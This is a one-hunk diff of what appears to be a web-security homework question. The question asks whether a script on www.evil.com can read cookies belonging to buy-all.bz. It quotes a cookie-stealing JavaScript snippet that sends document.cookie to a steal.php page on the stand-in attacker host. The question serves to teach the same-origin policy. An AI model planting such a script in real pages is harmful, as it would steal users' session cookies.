@@ -10,7 +10,7 @@
 
 4. Suppose that you accedently visit a malicious site www.evil.com, which contains a JavaScript to access cookies related to your e-shopping site buy-all.bz as follows:
 
-`<script>
+	`<script>
 img = new Image();
 img.src = "http://www.evil.com/steal.php?cookie=" + document.cookie;
 </script>`. Will that be successful? Why or why not?
